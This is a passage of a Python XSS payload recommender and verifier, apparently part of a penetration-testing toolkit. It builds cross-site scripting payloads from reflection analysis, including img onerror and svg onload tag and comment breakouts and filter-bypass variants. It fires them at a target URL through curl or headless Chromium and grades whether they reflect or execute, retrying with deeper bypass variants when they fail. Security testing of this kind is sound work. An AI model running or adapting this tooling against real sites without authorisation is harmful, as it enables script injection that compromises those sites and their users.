            if kw.get("img_tag", True) and kw.get("onerror", True) and hfuncs:
                for fn in hfuncs[:fn_cap]:
                    if shape_ok("gen_h_error", fn):
                        add(f'</{tag}><img src=x {marker} onerror={fn}>',
                            f"{tag} close + img onerror", "tag_breakout")
                        add(f'<{tag}><img title="{marker}</{tag}><img src onerror={fn}>"></{tag}>',
                            f"{tag} consuming-tag trick", "comment_break")

    elif ctx == "comment":
        if tags_ok and hfuncs and kw.get("svg_tag", True) \
                and kw.get("onload", True) and kw.get("pair_svg_onload", True):
            for fn in hfuncs[:fn_cap]:
                if shape_ok("gen_handler", fn):
                    add(f"--><svg {marker} onload={fn}>", "comment breakout",
                        "comment_break")

    return out


# --- marker-based DOM verification (DalFox R/V model) -------------------------

class MarkerDomCheck(HTMLParser):
    """Walk the response; record whether the marker element sits in an
    executable position (on* handler, script body, javascript:/data: URL).
    script_inert: mark <script> position as NON-executable — used on rendered
    DOM where a script-bearing marker reached this point only because nothing
    fired (innerHTML/insertAdjacentHTML-inserted scripts never execute). A
    script that truly ran was already caught by the alert-hook 'fired' list."""

    def __init__(self, marker, script_inert=False):
        super().__init__(convert_charrefs=False)
        self.marker = marker
        self.script_inert = script_inert
        self.executable = False
        self.evidence = ""
        self._in_script = False
        self._script_buf = None
        self.script_hits = []   # script bodies containing the needle
        self.attr_hits = []     # (tag, attr, value) executable attrs seen
        self.url_hits = []      # (tag, attr, value) javascript:/data: URLs

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "script":
            self._in_script = True
            self._script_buf = ""
        joined = " ".join(str(v or "") for v in d.values())
        if self.marker not in joined and self.marker not in "".join(d.keys()):
            return
        for k, v in d.items():
            if k.startswith("on"):
                self.executable = True
                self.attr_hits.append((tag, k, v or ""))
                self.evidence = f"<{tag}> marker element carries event handler {k}"
            if k in ("href", "src", "action", "formaction") and v and \
                    re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
                self.executable = True
                self.url_hits.append((tag, k, v))
                self.evidence = f"<{tag}> marker element has executable {k} URL"
            if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
                                                 v, re.I):
                self.executable = True
                self.evidence = "marker inside <iframe srcdoc> executable HTML"
        if tag == "script" and not self.script_inert:
            self.executable = True
            self.evidence = "marker inside <script> element"

    def handle_endtag(self, tag):
        if tag == "script":
            if self._script_buf and self.marker in self._script_buf:
                self.script_hits.append(self._script_buf)
            self._in_script = False
            self._script_buf = None

    def handle_data(self, data):
        if self._in_script:
            if self._script_buf is not None:
                self._script_buf += data
            if not self.script_inert and self.marker in data:
                self.executable = True
                self.evidence = "marker inside <script> body"


def _core_payload(marked, marker):
    """The sent payload minus the marker: strip a <!--marker--> tail and any
    in-payload marker, leaving the executable text we actually injected."""
    core = marked.replace(f"<!--{marker}-->", "")
    return core.replace(marker, "")


def _parse_response(raw):
    """Split curl -i output into (status, headers, body). Handles stacked
    header blocks (100-continue, redirects)."""
    status = 0
    headers = {}
    while raw.startswith("HTTP/"):
        _, _, rest = raw.partition("\n")
        m = re.match(r"HTTP/\S+\s+(\d+)", raw)
        if m:
            status = int(m.group(1))
        head, sep, body = rest.partition("\r\n\r\n")
        if not sep:
            head, sep, body = rest.partition("\n\n")
        if not sep:
            break
        for hl in head.splitlines():
            k, _, v = hl.partition(":")
            if k.strip():
                headers[k.strip().lower()] = v.strip()
        raw = body
    return status, headers, raw


def _locate_anchor(body, marker, marked):
    """Find what actually reflected: marker first, then core fallbacks
    (verbatim -> html-escaped -> url-encoded). Returns (needle, style)."""
    if marker in body:
        return marker, "marker"
    core = _core_payload(marked, marker)
    from html import escape as _he
    for variant, style in ((core, "core"),
                           (_he(core), "core html-encoded"),
                           (quote(core, safe=""), "core url-encoded")):
        if variant and variant in body:
            return variant, style
    return None, ""


def classify_response(status, headers, body, payload, marker, marked=None):
    """Grade one fetched response. Flow:
      blocked? -> marker/core anchor? -> executable position? -> JS ctx:
      surviving call inside payload span? -> V / V-truncated / R / none.
    Pure function over (status, headers, body) so every branch is testable.
    `marked` = the exact string sent (caller picks the marker tail); when
    omitted the legacy <!-- --> tail is assumed."""
    if marked is None:
        marked = payload.replace("vvm{id}", marker)
        if "vvm" not in marked:
            marked += f"<!--{marker}-->"
    core = _core_payload(marked, marker)
    csp = headers.get("content-security-policy", "")
    csp_note = ""
    if csp and re.search(r"(?:script-src|default-src)", csp) \
            and "unsafe-inline" not in csp:
        csp_note = " | CSP: script-src lacks 'unsafe-inline' — inline payload likely blocked"

    needle, style = _locate_anchor(body, marker, marked)
    if needle is None:
        if status >= 400:
            return {"payload": marked, "confidence": "blocked",
                    "evidence": f"HTTP {status} — request rejected before reflection"}
        return {"payload": marked, "confidence": "none",
                "evidence": "payload not reflected"
                            + (f" (HTTP {status})" if status else "")}

    chk = MarkerDomCheck(needle)
    chk.feed(body)
    if not chk.executable:
        ev = (f"marker stripped but {style} reflected, not in executable position"
              if style != "marker" else
              "marker reflected but not in executable position")
        return {"payload": marked, "confidence": "R", "evidence": ev}

    # JS contexts: marker-in-<script>-body — require a surviving call in the
    # payload span (Dalfox payload_range_hits_sink port). A marker inside a
    # script whose call was stripped (""-(1)-"") is dead code, not a finding.
    if chk.script_hits:
        import js_verify
        needles = [marked, core] if style == "marker" else [needle]
        mk = marker if style == "marker" else None
        for script_text in chk.script_hits:
            for nd in needles:
                live, det = js_verify.payload_live_in_js(script_text, nd, mk)
                if live:
                    ev = chk.evidence + " — " + det
                    return {"payload": marked, "confidence": "V",
                            "evidence": ev + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "marker in <script> but no surviving call — "
                            "executable core stripped or trapped"}

    # on* handlers: entity-decode the value the way the browser will, then
    # check the intended JS fragment produced a call
    if chk.attr_hits:
        import js_verify
        from html import unescape
        intended = js_verify.extract_intended_js(core)
        # a /*{marker}*/ tail strips to an empty /**/ husk in `core`, but the
        # reflected attr keeps the marker — offer the husk-free needle too
        husk = re.sub(r"/\*\s*\*/", "", intended)
        needles = [intended] + ([husk] if husk != intended else []) \
            + ([unescape(intended)]
               if unescape(intended) != intended else [])
        for _tag, _attr, val in chk.attr_hits:
            uv = unescape(val)
            for nd in needles:
                live, det = js_verify.payload_live_in_js(uv, nd)
                if live:
                    return {"payload": marked, "confidence": "V",
                            "evidence": chk.evidence + " — " + det + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "marker element has on* handler but injected JS "
                            "did not survive"}

    # javascript:/data: URLs — check the scheme body for a surviving call
    if chk.url_hits:
        import js_verify
        from html import unescape
        intended = js_verify.extract_intended_js(core)
        husk = re.sub(r"/\*\s*\*/", "", intended)
        needles = [intended] + ([husk] if husk != intended else []) \
            + ([unescape(intended)]
               if unescape(intended) != intended else [])
        for _tag, _attr, val in chk.url_hits:
            uv = unescape(val)
            body_js = re.sub(r"^\s*(?:javascript|data:text/html[^,]*,)\s*",
                             "", uv, flags=re.I)
            for nd in needles:
                live, det = js_verify.payload_live_in_js(body_js, nd)
                if live:
                    break
            if live:
                return {"payload": marked, "confidence": "V",
                        "evidence": chk.evidence + " — " + det +
                        " (requires click if href)" + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "executable URL attr but injected JS did not survive"}

    return {"payload": marked, "confidence": "V",
            "evidence": chk.evidence + csp_note}


def verify_payload(url, payload, render=False, comment_ok=True):
    """Inject payload with marker; grade V (executable) or R (reflected).
    render=True fetches via headless chromium — needed when the reflection
    lives only in the DOM (document.write/innerHTML sinks), and captures
    real execution via hooked alert/confirm/prompt/print calls.
    comment_ok=False picks a /* */ tail instead of <!-- --> — deny-page
    filters (strpos + die on <>) would otherwise kill the marker itself."""
    marker = "vvm" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
    marked = payload.replace("vvm{id}", marker)
    if "vvm" not in marked:
        marked += f"<!--{marker}-->" if comment_ok else f"/*{marker}*/"
    target = url.replace(PLACEHOLDER, quote(marked, safe=""))

    if render:
        try:
            from send_payloads import fetch_rendered
            body, rmeta = fetch_rendered(target)
        except Exception as e:
            return {"payload": marked, "confidence": "error",
                    "evidence": f"render failed: {e}"}
        fired = rmeta.get("fired") or []
        sink_hits = [n for n, a in rmeta.get("sinks", []) if marker in a]
        if fired:
            return {"payload": marked, "confidence": "V",
                    "evidence": "executed: " + "; ".join(fired[:3])}
        if marker not in body and not sink_hits:
            core = _core_payload(marked, marker)
            if core in body:
                return {"payload": marked, "confidence": "R",
                        "evidence": "marker stripped but core payload reflected "
                                    "— did not execute"}
            return {"payload": marked, "confidence": "none",
                    "evidence": "payload not reflected (rendered DOM)"}
        chk = MarkerDomCheck(marker, script_inert=True)
        chk.feed(body)
        if chk.executable:
            return {"payload": marked, "confidence": "R",
                    "evidence": chk.evidence + " — position only, did not fire"}
        ev = ("marker reached sink: " + ", ".join(sorted(set(sink_hits)))
              if sink_hits else "marker reflected but not in executable position")
        return {"payload": marked, "confidence": "R", "evidence": ev}

    try:
        raw = subprocess.run(
            ["curl", "-s", "-k", "-i", "--max-time", "15", "-A",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", target],
            capture_output=True, text=True, timeout=20).stdout
    except Exception as e:
        return {"payload": marked, "confidence": "error", "evidence": str(e)}
    status, headers, body = _parse_response(raw)
    return classify_response(status, headers, body, payload, marker, marked)


# --- main --------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Recommend XSS payloads from reflection analysis")
    ap.add_argument("--analysis", help="path to *-xss_reflection_analysis.json "
                                       "(default: latest in Skills/log/)")
    ap.add_argument("--url", help="target URL with {xss_testing} placeholder "
                                  "(required for --verify)")
    ap.add_argument("--keywords", help="path to *-xss_keyword_analysis.json "
                                       "(default: latest in Skills/log/, if any)")
    ap.add_argument("--verify", action="store_true",
                    help="inject top payloads with a marker and grade R/V")
    ap.add_argument("--render", action="store_true",
                    help="verify via rendered DOM (headless chromium) — for "
                         "DOM sinks like document.write(location.search); "
                         "auto-enabled when the analysis came from --render")
    ap.add_argument("--top", type=int, default=3,
                    help="max payload candidates per reflection (default 3)")
    args = ap.parse_args()

    print("=" * 80)
    print("Recommend Payload  (breaker -> char-gate -> grammar -> marker verify)")
    print(f"Date: {datetime.now().isoformat()}")
    print("=" * 80)

    analysis_file = args.analysis or latest_log_path("xss_reflection_analysis", "json")
    if not analysis_file or not os.path.exists(analysis_file):
        print("No reflection analysis found. Run check_reflection.py first.")
        return
    print(f"Reading analysis: {analysis_file}\n")

    analysis = json.load(open(analysis_file))
    results = analysis["results"]
    source_html = analysis.get("source_html", "")
    refl_ids = sorted({r["reflection_index"] for r in results})

    # Layer B/C keyword mask (probe2) — optional; absent = assume all allowed
    kw_file = args.keywords or latest_log_path("xss_keyword_analysis", "json")
    kw_by_refl = {}
    kwv_by_refl = {}
    if kw_file and os.path.exists(kw_file):
        kwdata = json.load(open(kw_file))
        for r in kwdata.get("results", []):
            kw_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = r["passed"]
            kwv_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = \
                (r.get("expected", ""), r.get("got_back", ""))
        print(f"Keyword mask:     {kw_file}\n")
    else:
        print("Keyword mask:     none found (run send_payloads.py --probe2 + "
              "check_reflection.py --keywords to enable Layer B/C gating)\n")

    report = {"generated_by": "recommend_payload.py",
              "generated_at": datetime.now().isoformat(),
              "source_analysis": analysis_file,
              "source_keyword_analysis": kw_file if kw_by_refl else None,
              "reflections": []}

    for rid in refl_ids:
        raw_ctxs = [c for r in results if r["reflection_index"] == rid
                    for c in r["contexts"]]
        ctxs = [k for c in raw_ctxs for k in normalize_contexts([c])]
        ctx = ctxs[0]
        # "dom sink: innerHTML (html body)" -> inert scripts never execute
        m_sink = next((m for c in raw_ctxs
                       if (m := re.search(r"dom sink:\s*([\w:.-]+)", c))), None)
        inert = bool(m_sink) and m_sink.group(1).lower() in INERT_SCRIPT_SINKS
        scores = char_scores(results, rid)
        kw = kw_by_refl.get(rid, {})
        kwv = kwv_by_refl.get(rid, {})
        quote_ch = detect_quote(source_html, "testing1")
        # bisect-attributed rows (reflection_index 0) come from a deny page
        # with no reflection — the baseline probe carries the real quote
        if rid == 0 and analysis.get("attribution_quote"):
            quote_ch = analysis["attribution_quote"]
        cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert)
        # rank on equal efficiency: direct payloads execute as-is;
        # splitter probes test THIS filter's actual deletion set;
        # blind mutations (case/entity) are last-resort guesses.
        # Without tiers, --top N slots get spent on probes in
        # insertion order and the working vector never gets fired.
        def tier(c):
            t = c["technique"]
            if "splitter" in t or "bypass" in t:
                return 1
            if c["case_ref"] == "tag_removed" or "case-mutated" in t \
                    or "entity" in t or "unicode-escaped" in t \
                    or "bracket-access" in t:
                return 2
            return 0
        cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
        cand = cand[: args.top]

        print(f"--- Reflection [{rid}]  context={ctx}  quote='{quote_ch or 'unquoted'}'")
        print(f"    char efficiency: " +
              " ".join(f"{c}={s}" for c, s in scores.items()))
        if kw:
            print(f"    keyword mask:    " +
                  " ".join(f"{k}={'OK' if v else 'BLOCKED'}" for k, v in kw.items()))
        if not cand:
            print("    [NO CANDIDATE] no payload passes the char gate -> "
                  "consult case/ manually or extend grammar")
        for i, c in enumerate(cand):
            print(f"    [{i + 1}] eff={c['efficiency']}%  {c['payload']}")
            print(f"        technique: {c['technique']}  |  case: {c['case_ref']}")

        entry = {"reflection_index": rid, "context": ctx,
                 "quote": quote_ch, "scores": scores, "keyword_mask": kw,
                 "candidates": cand}

        if args.verify and cand:
            if not args.url or PLACEHOLDER not in (args.url or ""):
                print("    [!] --verify needs --url containing {xss_testing}")
            else:
                render = args.render or analysis.get("probe_mode") == "render"
                print(f"    verifying top payloads{render and ' (rendered DOM)' or ''}...")
                # Verify waves: start shallow (fn_cap=2, matching the emitted
                # list). When every candidate fails, re-compose with a deeper
                # fn slice and verify the next unseen batch — deeper bracket
                # splits and name variants — instead of stopping at the first
                # dead signatures.
                seen, verified = set(), []
                cap, wave = 2, cand
                # deny-page filters kill the marker itself when the <!-- -->
                # tail carries <>: fall back to a /* */ comment tail — it
                # lands inert inside handlers/attrs and survives strpos lists
                comment_ok = usable("<", scores) and usable(">", scores)
                while wave:
                    found = False
                    for c in wave:
                        if c["payload"] in seen:
                            continue
                        seen.add(c["payload"])
                        v = verify_payload(args.url, c["payload"],
                                           render=render,
                                           comment_ok=comment_ok)
                        verified.append(v)
                        if v["confidence"] == "V":
                            found = True
                            if cap > 2:
                                break      # expansion wave: first hit suffices
                    if found or cap >= 16:
                        break
                    cap *= 2
                    more = compose(ctx, quote_ch, scores, kw, kwv, inert,
                                   fn_cap=cap)
                    more.sort(key=lambda c: (-c["efficiency"], tier(c)))
                    wave = [c for c in more
                            if c["payload"] not in seen][:args.top]
                entry["verification"] = verified
                for v in verified:
                    print(f"        [{v['confidence']}] {v['payload']}")
                    print(f"            {v['evidence']}")
        print()
        report["reflections"].append(entry)

    out_file = new_log_path("xss_recommendation", "json")
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"💾 Recommendation saved to: {out_file}")


if __name__ == "__main__":
    main()
